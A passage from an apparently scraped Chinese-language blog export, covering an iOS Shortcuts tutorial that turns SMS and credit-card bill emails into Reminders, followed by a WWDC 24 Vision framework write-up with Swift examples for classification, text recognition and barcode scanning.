當收到簡訊包含「送達」時新增提醒事項 (一般都是「送達」)設定方式1.安裝＆ 打開 捷徑 App2.切換到「自動化」頁籤，選擇右上角「+」，下滑找到「訊息」3. 設定訊息條件同前文自動轉發簡訊介紹的何時條件，這邊設定 訊息內容包含「送達」 和改成 「立即執行」 。4. 新增自動化操作 ＆ 設定提醒時間首先我們要先設定提醒事項的到期日，新增一個日期變數，計算當收到訊息的時間開始 + 多少時間等於我們要的提醒時間。 選擇 「新增空白的自動化操作」 下方搜尋匡搜尋 「調整日期」 選擇 「調整日期」 選擇 將「日期」加上 0 秒 的 「日期」 輸入匡 下方選取變數，選擇 「目前的日期」 選擇 加上 0 「秒」 ，的 「秒」 輸入匡，改成 「天」 輸入你希望多久到期提醒的天數，這邊我輸入 3 天 點擊選單旁邊「X」關閉5. 新增提醒事項動作 在搜尋匡輸入 「提醒」 下滑找到＆點擊 「新增提醒事項」新增「新增提醒事項」後 先點擊 將「提醒事項」加入「提醒事項」並不提示 ，的第一個 「提醒事項」 輸入匡 向右滑找到＆點擊 「捷徑輸入」 點擊 將「捷徑輸入」加入「提醒事項」並不提示 ，的 「捷徑輸入」 輸入匡 跳出下方選單，將原本選擇的 「訊息」 改為 「內容」 點擊選單旁邊「X」關閉6. 設定提示提醒 將 「不提示」 改選擇 「提示」 選擇 於時間「下午 2:00」 的 「下午 2:00」 輸入匡，選擇變數 「已調整日期」 點擊選單旁邊「X」關閉 都沒問題後點擊右上角「完成」如果點完成沒反應那可能是遇到 iOS Bug，可以不管他直接點返回回到首頁。 回到捷徑自動化首頁可以查看、暫停、修改這則捷徑。完成！同前述，只要坐等新簡訊進來，符合包含的關鍵字就會自動建立提醒事項(就算手機沒解鎖)，礙於目前功能限制，每個關鍵字都要建立一個捷徑，同個簡訊包含到不同關鍵字會建立兩次。場景 3 — 收到信用卡帳單郵件時-自動建立提醒待辦事項另一個生活通知是信用卡帳單通知；設定類似簡訊，當收到電子郵件時也能觸發捷徑自動化新增提醒事項；但因目前自動化功能未開放給第三方 App，所以只能使用 Apple 郵件 App 觸發。效果設定條件如下： 當收到電子郵件標題包含「信用卡帳單」時新增提醒事項 請注意每家的格式都不一樣 Orz，有的叫「信用卡電子帳單」、「信用卡電子對帳單」國泰的更狠叫「信用卡XXXX年X月電子帳單」 因為暫時不支援 Regex 所以只能使用文字匹配，同前述 每個關鍵字都要新增一則捷徑。1.確認你已安裝 郵件 App 並完成信箱帳號登入 (Gmail 也可)2.確認郵件擷取設定確認「設定」-&gt;「郵件」-&gt;「帳號」-&gt;「擷取新資料」設定為擷取或推播。3.安裝＆ 打開 捷徑 App4.切換到「自動化」頁籤，選擇右上角「+」，下滑找到「電子郵件」3. 設定電子郵件條件 「標題包含」： 信用卡帳單 多個關鍵字要個別建立多個捷徑。 「確認後執行」改成 立即執行 點擊「下一步」何時 — 其他設定： 「寄件人」：多個，但要加入到聯絡人 其他過濾條件 — 帳號：可篩選來源是 iCloud or Gmail 其他過濾條件 — 收件人：多個，但要加入到聯絡人，一般就是自己的多個帳號4. 新增自動化操作 ＆ 設定提醒時間先設定提醒事項的到期日，新增一個日期變數，計算當收到訊息的時間開始 + 多少時間等於我們要的提醒時間。 選擇 「新增空白的自動化操作」 下方搜尋匡搜尋 「調整日期」 選擇 「調整日期」 選擇 將「日期」加上 0 秒 的 「日期」 輸入匡 下方選取變數，選擇 「目前的日期」 加上 0「秒」 的 「秒」 改成 「天」 輸入你希望多久到期提醒的天數，這邊我輸入 3 天 點擊選單旁邊「X」關閉5. 設定過濾信件跟訊息一則一則觸發不一樣，郵件的觸發是批次擷取，因此只要那批次有出現關鍵字標題的信件，那幾封新信件也會被一同送進來。 不確定是不是捷徑 Bug，但總之結果就是如此。舉例：批次擷取到三封信，有一封家樂福通知信、信用卡帳單信、Uber 通知信，這三封都會做為捷徑輸入給我們；因此我們要再加一個步驟過濾出我們要的關鍵字信件。虛擬邏輯：for 信件標題 in 信件s if 信件標題.contain(\"信用卡帳單\") then 新增提醒事項 else end end 在搜尋匡輸入 「重複」 下滑找到＆點擊 「重複每一個」 新增完會抓錯變數，選擇 重複「已調整日期」中的每個項目 的 「已調整日期」 輸入匡，選擇 「清除變數」 清除後，選擇 重複「項目」中的每個項目 的 「項目」 輸入匡，選擇 「捷徑輸入」 在搜尋匡輸入 「如果」 下滑找到＆點擊 「如果」 這時候位置會是錯的 拖曳 若「重複結果」「狀況」 動作到 重複「捷徑輸入」中的每個項目 下面(內) 確認最終位置圖如上圖二，如果不對請刪除重複跟如果並從上一步重新操作 點擊 若「重複結果」「狀況」 的 「重複結果」 輸入匡，下方改選擇 「標題」 ，點擊選單旁邊「X」關閉 點擊 若「標題」「狀況」 的 「標題」 輸入匡，改選擇 「包含」 ，輸入 「信用卡帳單」 ，點擊鍵盤的「完成」6. 設定過濾信件 在搜尋匡輸入「提醒」下滑找到＆點擊「新增提醒事項」 一樣這時候位置會是錯的 拖曳 將「提醒事項」加入「提醒事項」並「不提示」 動作到 若「標題」「包含」「信用卡帳單」 下面(內) 確認最終位置圖如上圖三，如果不對請刪除重複跟如果並從上一步重新操作新增「新增提醒事項」後 點擊 將「提醒事項」加入「提醒事項」並「不提示」 ，的第一個 「提醒事項」 輸入匡 向右滑找到＆點擊 「重複項目」 回到上方點擊 「重複項目」 輸入匡，將原本選擇的 「電子郵件」 改為 「標題」 點擊選單旁邊「X」關閉6. 設定提示提醒 將 「不提示」 改選擇 「提示」 選擇 於時間 下午 2:00 的 「下午 2:00」 輸入匡，選擇變數 「已調整日期」 點擊選單旁邊「X」關閉 沒問題點擊右上角「完成」如果點完成沒反應那可能是遇到 iOS Bug，可以不管他直接點返回回到首頁。 回到捷徑自動化首頁可以查看、暫停、修改這則捷徑。完成！郵件的設定相對較複雜一點，因為是批次擷取所以還需要再次篩選一次，然後把篩選結果建立提醒事項。 現在有新的郵件、Apple 郵件擷取完，裡面有信用卡帳單標題的話就會自動建立囉！ 因為 Apple 郵件是用擷取的 (非 iCloud 的話)，因此信件收取也不會是即時的，會延遲一陣子。其他捷徑自動化執行完會跳通知，這通知無法關閉。結束現在已完成了幾個基礎的自動化整合功能，簡單幾個步驟節省你日常的心力；其他進階串接，例如打 API 整合到 Notion 或更複雜的整合，技術上也都能達成， 缺的不是技術是你天馬行空的自動化想法！其他自動化延伸閱讀 使用 Google Apps Script 實現 Google 服務 RPA 自動化 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 4,765 Total Views Last Statistics Date: 2025-01-19 | 4,108 Views on Medium. " }, { "title": "iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session", "url": "/posts/755509180ca8/", "categories": "KKday Tech Blog", "tags": "ios-app-development, vision-framework, apple-intelligence, ai, machine-learning", "date": "2024-08-13 16:10:37 +0800", "snippet": "iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework SessionVision framework 功能回顧 &amp; iOS 18 新 Swift API 試玩Photo by BoliviaInteligente主題跟 Vision Pro 的關係就跟熱狗跟狗的關係一樣，毫...", "content": "iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework SessionVision framework 功能回顧 &amp; iOS 18 新 Swift API 試玩Photo by BoliviaInteligente主題跟 Vision Pro 的關係就跟熱狗跟狗的關係一樣，毫無關係。Vision frameworkVision framework 是 Apple 整合機器學習的圖像辨識框架，讓開發者可以簡單快速地實現常見的圖像辨識功能；Vision framework 早在 iOS 11.0+ (2017/ iPhone 8) 就已推出，期間不斷地迭代優化，並完善與 Swift Concurrency 的特性整合提升執行效能，並且從 iOS 18.0 提供全新的 Swift Vision framework API 發揮 Swift Concurrency 最大效果。Vision framework 特色 內建眾多圖片辨識、動態追蹤方法 (iOS 18 為止一共 31 種) On-Device 單純使用手機晶片運算，辨識過程不依賴雲端服務，快速又安全 API 簡單好操作 Apple 全平台均支援 iOS 11.0+, iPadOS 11.0+, Mac Catalyst 13.0+, macOS 10.13+, tvOS 11.0+, visionOS 1.0+ 已發布多年 (2017~今) 且不斷更新 整合 Swift 語言特性提升運算效能 6 年前曾經小玩過： Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift) 這次搭配 WWDC 24 Discover Swift enhancements in the Vision framework Session 重新回顧並結合新的 Swfit 特性再玩一次。CoreMLApple 還有另外一個 Framework 叫 CoreML ，也是基於 On-Device 晶片的機器學習框架；但他可以讓你自己訓練想辨識的物件、文件模型，並將模型放到 App 中直接使用，有興趣的朋友也可以玩看看。(e.g. 即時文章分類 、即時 垃圾訊息檢測 …)p.s.Vision v.s. VisionKit ： Vision ：主要用於圖像分析任務，如臉部識別、條碼檢測、文本識別等。它提供了強大的 API 來處理和分析靜態圖像或視頻中的視覺內容。 VisionKit ：專門用於處理與文件掃描相關的任務。它提供了一個掃描儀視圖控制器，可以用來掃描文檔，並生成高質量的 PDF 或圖像。Vision framework 在 M1 機型上無法跑在模擬器，只能接實體手機測試；在模擬器環境執行會拋出 Could not create Espresso context Error，查 官方論壇討論，沒找到解答 。 因手邊沒有實體 iOS 18 裝置進行測試，所以本文中的所有執行結果都是使用舊的 (iOS 18 以前) 的寫法結果； 如新寫法有出現錯誤再麻煩留言指教 。WWDC 2024 — Discover Swift enhancements in the Vision frameworkDiscover Swift enhancements in the Vision framework 本文是針對 WWDC 24 — Discover Swift enhancements in the Vision framework Session 的分享筆記，跟一些自己實驗的心得。Introduction — Vision framework Features人臉辨識、輪廓識別圖像內容文字辨識截至 iOS 18 為止，支援 18 種語言。// 支援的語系列表if #available(iOS 18.0, *) { print(RecognizeTextRequest().supportedRecognitionLanguages.map { \"\\($0.languageCode!)-\\(($0.region?.identifier ?? $0.script?.identifier)!)\" })} else { print(try! VNRecognizeTextRequest().supportedRecognitionLanguages())}// 實際可用辨識語言以這為主。// 實測 iOS 18 輸出以下結果：// [\"en-US\", \"fr-FR\", \"it-IT\", \"de-DE\", \"es-ES\", \"pt-BR\", \"zh-Hans\", \"zh-Hant\", \"yue-Hans\", \"yue-Hant\", \"ko-KR\", \"ja-JP\", \"ru-RU\", \"uk-UA\", \"th-TH\", \"vi-VT\", \"ar-SA\", \"ars-SA\"]// 未看到 WWDC 提到的 Swedish 語言，不確定是還沒推出還是跟裝置地區、語系有關聯動態動作捕捉 可以實現人、物件動態捕捉 手勢補捉實現隔空簽名功能What’s new in Vision? (iOS 18)— 圖片評分功能 (品質、記憶點) 可對輸入圖片得計算出分數，方便篩選出優質照片 分數計算方式包含多個維度，不只是畫質，還有光線、角度、拍攝主體、 是否有讓人感到的記憶點 …等等WWDC 中給了以上三張圖片做說明(相同畫質之下)，分別是： 高分的圖片：取景、光線、有記憶點 低分的圖片：沒有主體、像是隨手或不小心拍的 素材的圖片：技術上拍的很好但是沒有記憶點，像是作為素材圖庫用的圖片iOS ≥ 18 New API: CalculateImageAestheticsScoresRequestlet request = CalculateImageAestheticsScoresRequest()let result = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!)// 照片分數print(result.overallScore)// 是否被判定為素材圖片print(result.isUtility)What’s new in Vision? (iOS 18) — 身體＋手勢姿勢同時偵測以往只能個別偵測人體 Pose 和 手部 Pose，這次更新可以讓開發者同時偵測身體 Pose + 手部 Pose，合成同一個請求跟結果，方便我們做更多應用功能開發。iOS ≥ 18 New API: DetectHumanBodyPoseRequestvar request = DetectHumanBodyPoseRequest()// 一併偵測手部 Poserequest.detectsHands = trueguard let bodyPose = try await request.perform(on: image). first else { return }// 身體 Pose Jointslet bodyJoints = bodyPose.allJoints()// 左手 Pose Jointslet leftHandJoints = bodyPose.leftHand.allJoints()// 右手 Pose Jointslet rightHandJoints = bodyPose.rightHand.allJoints()New Vision APIApple 在這次的更新當中提供了新的 Swift Vision API 封裝給開發者使用，除了基本的包含原本的功能支援之外，主要針對加強 Swift 6 / Swift Concurrency 的特性，提供效能更優、寫起來更 Swift 的 API 操作方式。Get started with Vision這邊講者又重新介紹了一次 Vision framework 的基礎使用方式，Apple 已經封裝好了 31 種 (截至 iOS 18)常見的圖像辨識請求「Request」與對應回傳的「Observation」物件。 Request: DetectFaceRectanglesRequest 人臉區域識別請求Result: FaceObservation之前的文章「 Vision 初探 — APP 頭像上傳 自動識別人臉裁圖 (Swift) 」就是用這對請求。 Request: RecognizeTextRequest 文字辨識請求Result: RecognizedTextObservation Request: GenerateObjectnessBasedSaliencyImageRequest 主體物件辨識請求Result: SaliencyImageObservation全部 31 種請求 Request：VisionRequest 。 Request 用途 Observation 說明 CalculateImageAestheticsScoresRequest計算圖像的美學分數。 AestheticsObservation返回圖像的美學評分，如構圖、色彩等因素。 ClassifyImageRequest分類圖像內容。 ClassificationObservation返回圖像中物體或場景的分類標籤及置信度。 CoreMLRequest使用 Core ML 模型分析圖像。 CoreMLFeatureValueObservation根據 Core ML 模型的輸出結果生成觀察值。 DetectAnimalBodyPoseRequest檢測圖像中的動物姿勢。 RecognizedPointsObservation返回動物的骨架點及其位置。 DetectBarcodesRequest檢測圖像中的條碼。 BarcodeObservation返回條碼數據及類型（如 QR code）。 DetectContoursRequest檢測圖像中的輪廓。 ContoursObservation返回圖像中檢測到的輪廓線。 DetectDocumentSegmentationRequest檢測並分割圖像中的文件。 RectangleObservation返回文件邊界的矩形框位置。 DetectFaceCaptureQualityRequest評估面部捕捉質量。 FaceObservation返回面部圖像的質量評估分數。 DetectFaceLandmarksRequest檢測面部特徵點。 FaceObservation返回面部特徵點（如眼睛、鼻子等）的詳細位置。 DetectFaceRectanglesRequest檢測圖像中的面部。 FaceObservation返回人臉的邊界框位置。 DetectHorizonRequest檢測圖像中的地平線。 HorizonObservation返回地平線的角度和位置。 DetectHumanBodyPose3DRequest檢測圖像中的 3D 人體姿勢。 RecognizedPointsObservation返回 3D 人體骨架點及其空間坐標。 DetectHumanBodyPoseRequest檢測圖像中的人體姿勢。 RecognizedPointsObservation返回人體骨架點及其坐標。 DetectHumanHandPoseRequest檢測圖像中的手部姿勢。 RecognizedPointsObservation返回手部骨架點及其位置。 DetectHumanRectanglesRequest檢測圖像中的人體。 HumanObservation返回人體的邊界框位置。 DetectRectanglesRequest檢測圖像中的矩形。 RectangleObservation返回矩形的四個頂點坐標。 DetectTextRectanglesRequest檢測圖像中的文本區域。 TextObservation返回文本區域的位置和邊界框。 DetectTrajectoriesRequest檢測並分析物體運動軌跡。 TrajectoryObservation返回運動軌跡點及其時間序列。 GenerateAttentionBasedSaliencyImageRequest生成基於注意力的顯著性圖像。 SaliencyImageObservation返回圖像中最具吸引力區域的顯著性地圖。 GenerateForegroundInstanceMaskRequest生成前景實例掩膜圖像。 InstanceMaskObservation返回前景物體的掩膜。 GenerateImageFeaturePrintRequest生成圖像特徵指紋以進行比較。 FeaturePrintObservation返回圖像的特徵指紋數據，用於相似度比較。 GenerateObjectnessBasedSaliencyImageRequest生成基於物體顯著性的圖像。 SaliencyImageObservation返回物體顯著性區域的顯著性地圖。 GeneratePersonInstanceMaskRequest生成人物實例掩膜圖像。 InstanceMaskObservation返回人物實例的掩膜。 GeneratePersonSegmentationRequest生成人物分割圖像。 SegmentationObservation返回人物分割的二值圖。 RecognizeAnimalsRequest檢測並識別圖像中的動物。 RecognizedObjectObservation返回動物類型及其置信度。 RecognizeTextRequest檢測並識別圖像中的文本。 RecognizedTextObservation返回檢測到的文本內容及其區域位置。 TrackHomographicImageRegistrationRequest跟踪圖像的同位影像配準。 ImageAlignmentObservation返回圖像間的同位變換矩陣，用於影像配準。 TrackObjectRequest跟踪圖像中的物體。 DetectedObjectObservation返回物體在影像中的位置和速度信息。 TrackOpticalFlowRequest跟踪圖像中的光流。 OpticalFlowObservation返回光流矢量場，用於描述像素移動情況。 TrackRectangleRequest跟踪圖像中的矩形。 RectangleObservation返回矩形在影像中的位置、大小和旋轉角度。 TrackTranslationalImageRegistrationRequest跟踪圖像的平移影像配準。 ImageAlignmentObservation返回圖像間的平移變換矩陣，用於影像配準。 前面補上 VN 就是舊的 API 寫法 (iOS 18 以前的版本)講者提到了幾個常用的 Request，如下。ClassifyImageRequest辨識輸入的圖片，得到標籤分類與置信度。[遊記] 2024 二訪九州 9 日自由行，經釜山→博多郵輪入境if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API let request = ClassifyImageRequest() Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*yL3vI1ADzwlovctW5WQgJw.jpeg\")!) observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNClassificationObservation] else { return } observations.forEach { observation in print(\"\\(observation.identifier): \\(observation.confidence)\") } } let request = VNClassifyImageRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/cb65fd5ab770/1*3_jdrLurFuUfNdW4BJaRww.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果： • outdoor（戶外）: 0.75392926 • sky（天空）: 0.75392926 • blue_sky（藍天）: 0.7519531 • machine（機器）: 0.6958008 • cloudy（多雲）: 0.26538086 • structure（結構）: 0.15728651 • sign（標誌）: 0.14224191 • fence（柵欄）: 0.118652344 • banner（橫幅）: 0.0793457 • material（材料）: 0.075975396 • plant（植物）: 0.054406323 • foliage（樹葉）: 0.05029297 • light（光）: 0.048126098 • lamppost（燈柱）: 0.048095703 • billboards（廣告牌）: 0.040039062 • art（藝術）: 0.03977703 • branch（樹枝）: 0.03930664 • decoration（裝飾）: 0.036868922 • flag（旗幟）: 0.036865234....略RecognizeTextRequest辨識圖片中的文字內容。(a.k.a 圖片轉文字)[遊記] 2023 東京 5 日自由行if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var request = RecognizeTextRequest() request.recognitionLevel = .accurate request.recognitionLanguages = [.init(identifier: \"ja-JP\"), .init(identifier: \"en-US\")] // Specify language code, e.g., Traditional Chinese Task { do { let observations = try await request.perform(on: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!) observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let request = VNRecognizeTextRequest(completionHandler: completionHandler) request.recognitionLevel = .accurate request.recognitionLanguages = [\"ja-JP\", \"en-US\"] // Specify language code, e.g., Traditional Chinese DispatchQueue.global().async { let handler = VNImageRequestHandler(url: URL(string: \"https://zhgchg.li/assets/9da2c51fa4f2/1*fBbNbDepYioQ-3-0XUkF6Q.jpeg\")!, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果：LE LABO 青山店TEL:03-6419-7167＊お買い上げありがとうございます*No: 21347日付：2023/06/10 14.14.57担当：1690370レジ：008A 1商品名税込上代数量税込合計カイアック 10 EDP FB 15MLJ1P7010000S16,80016,800アナザー 13 EDP FB 15MLJ1PJ010000S10,70010,700リップパーム 15MLJOWC010000S2,0001合計金額（内税額）CARD2,0003点御買上げ29,500029,50029,500DetectBarcodesRequest偵測圖片中的條碼、QRCode 數據。泰國當地人推薦鵝牌清涼膏let filePath = Bundle.main.path(forResource: \"IMG_6777\", ofType: \"png\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API let request = DetectBarcodesRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } observations.forEach { observation in print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果：Payload: 8859126000911Symbology: VNBarcodeSymbologyEAN13Payload: https://lin.ee/hGynbVMSymbology: VNBarcodeSymbologyQRPayload: http://www.hongthaipanich.com/Symbology: VNBarcodeSymbologyQRPayload: https://www.facebook.com/qr?id=100063856061714Symbology: VNBarcodeSymbologyQRRecognizeAnimalsRequest辨識圖片中的動物與置信度。meme Sourcelet filePath = Bundle.main.path(forResource: \"IMG_5026\", ofType: \"png\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API let request = RecognizeAnimalsRequest() Task { do { let observations = try await request.perform(on: fileURL) observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedObjectObservation] else { return } observations.forEach { observation in let labels = observation.labels labels.forEach { label in print(\"Detected animal: \\(label.identifier) with confidence: \\(label.confidence)\") } } } let request = VNRecognizeAnimalsRequest(completionHandler: completionHandler) DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}分析結果：Detected animal: Cat with confidence: 0.77245045其他： 偵測圖像中的人體：DetectHumanRectanglesRequest 偵測人、動物的 Pose 動作 (3D or 2D 都可以)：DetectAnimalBodyPoseRequest、DetectHumanBodyPose3DRequest、DetectHumanBodyPoseRequest、DetectHumanHandPoseRequest 檢測並追蹤物件的運動軌跡(在影片、動畫不同的偵中)：DetectTrajectoriesRequest、TrackObjectRequest、TrackRectangleRequestiOS ≥ 18 Update Highlight:VN*Request -&gt; *Request (e.g. VNDetectBarcodesRequest -&gt; DetectBarcodesRequest)VN*Observation -&gt; *Observation (e.g. VNRecognizedObjectObservation -&gt; RecognizedObjectObservation)VNRequestCompletionHandler -&gt; async/awaitVNImageRequestHandler.perform([VN*Request]) -&gt; *Request.perform()WWDC ExampleWWDC 官方影片以超市商品掃描器為例。首先大多數的商品都有 Barcode 可供掃描我們可以從 observation.boundingBox 取得 Barcode 所在位置，但不同於常見 UIView 座標系， BoundingBox 的相對位置起點是從左下角，值的範圍落在 0~1 之間。let filePath = Bundle.main.path(forResource: \"IMG_6785\", ofType: \"png\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var request = DetectBarcodesRequest() request.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 Task { do { let observations = try await request.perform(on: fileURL) if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // 標記顏色 Layer let colorLayer = CALayer() // iOS &gt;=18 新的座標轉換 API toImageCoordinates // 未經測試，實際可能還需要計算 ContentMode = AspectFit 的位移: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let completionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // 標記顏色 Layer let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let request = VNDetectBarcodesRequest(completionHandler: completionHandler) request.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([request]) } catch { print(\"Request failed: \\(error)\") } }}iOS ≥ 18 Update Highlight:// iOS &gt;=18 新的座標轉換 API toImageCoordinatesobservation.boundingBox.toImageCoordinates(CGSize, origin: .upperLeft)// https://developer.apple.com/documentation/vision/normalizedpoint/toimagecoordinates(from:imagesize:origin:)Helper:// Gen by ChatGPT 4o// 因為照片在 ImageView 是設定 ContentMode = AspectFit// 所以要多計算上下因 Fit 造成的空白位移func convertBoundingBox(_ boundingBox: CGRect, to view: UIImageView) -&gt; CGRect { guard let image = view.image else { return .zero } let imageSize = image.size let viewSize = view.bounds.size let imageRatio = imageSize.width / imageSize.height let viewRatio = viewSize.width / viewSize.height var scaleFactor: CGFloat var offsetX: CGFloat = 0 var offsetY: CGFloat = 0 if imageRatio &gt; viewRatio { // 圖像在寬度方向上適配 scaleFactor = viewSize.width / imageSize.width offsetY = (viewSize.height - imageSize.height * scaleFactor) / 2 } else { // 圖像在高度方向上適配 scaleFactor = viewSize.height / imageSize.height offsetX = (viewSize.width - imageSize.width * scaleFactor) / 2 } let x = boundingBox.minX * imageSize.width * scaleFactor + offsetX let y = (1 - boundingBox.maxY) * imageSize.height * scaleFactor + offsetY let width = boundingBox.width * imageSize.width * scaleFactor let height = boundingBox.height * imageSize.height * scaleFactor return CGRect(x: x, y: y, width: width, height: height)}輸出結果BoundingBox: (0.5295758928571429, 0.21408638121589782, 0.0943080357142857, 0.21254415360708087)Payload: 4710018183805Symbology: VNBarcodeSymbologyEAN13部分商品無 Barcode，如散裝水果只有商品標籤因此我們的掃瞄器也需要同時支援掃描純文字標籤。let filePath = Bundle.main.path(forResource: \"apple\", ofType: \"jpg\")! // 本地測試圖片let fileURL = URL(filePath: filePath)if #available(iOS 18.0, *) { // 新的使用 Swift 特性的 API var barcodesRequest = DetectBarcodesRequest() barcodesRequest.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 var textRequest = RecognizeTextRequest() textRequest.recognitionLanguages = [.init(identifier: \"zh-Hnat\"), .init(identifier: \"en-US\")] Task { do { let handler = ImageRequestHandler(fileURL) // parameter pack syntax and we must wait for all requests to finish before we can use their results. // let (barcodesObservation, textObservation, ...) = try await handler.perform(barcodesRequest, textRequest, ...) let (barcodesObservation, textObservation) = try await handler.perform(barcodesRequest, textRequest) if let observation = barcodesObservation.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadString // 標記顏色 Layer let colorLayer = CALayer() // iOS &gt;=18 新的座標轉換 API toImageCoordinates // 未經測試，實際可能還需要計算 ContentMode = AspectFit 的位移: colorLayer.frame = observation.boundingBox.toImageCoordinates(self.baseImageView.frame.size, origin: .upperLeft) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox.cgRect)\") print(\"Payload: \\(observation.payloadString ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology)\") } textObservation.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } catch { print(\"Request failed: \\(error)\") } }} else { // 舊的寫法 let barcodesCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNBarcodeObservation] else { return } if let observation = observations.first { DispatchQueue.main.async { self.infoLabel.text = observation.payloadStringValue // 標記顏色 Layer let colorLayer = CALayer() colorLayer.frame = self.convertBoundingBox(observation.boundingBox, to: self.baseImageView) colorLayer.backgroundColor = UIColor.red.withAlphaComponent(0.5).cgColor self.baseImageView.layer.addSublayer(colorLayer) } print(\"BoundingBox: \\(observation.boundingBox)\") print(\"Payload: \\(observation.payloadStringValue ?? \"No payload\")\") print(\"Symbology: \\(observation.symbology.rawValue)\") } } let textCompletionHandler: VNRequestCompletionHandler = { request, error in guard error == nil else { print(\"Request failed: \\(String(describing: error))\") return } guard let observations = request.results as? [VNRecognizedTextObservation] else { return } observations.forEach { observation in let topCandidate = observation.topCandidates(1).first print(topCandidate?.string ?? \"No text recognized\") } } let barcodesRequest = VNDetectBarcodesRequest(completionHandler: barcodesCompletionHandler) barcodesRequest.symbologies = [.ean13] // 如果只要掃描 EAN13 Barcode，可直接指定，提升效能 let textRequest = VNRecognizeTextRequest(completionHandler: textCompletionHandler) textRequest.recognitionLevel = .accurate textRequest.recognitionLanguages = [\"en-US\"] DispatchQueue.global().async { let handler = VNImageRequestHandler(url: fileURL, options: [:]) do { try handler.perform([barcodesRequest, textRequest]) } catch { print(\"Request failed: \\(error)\") } }}輸出結果：94128sORGANICPink Lady®Produce of UShiOS ≥ 18 Update Highlight:let handler = 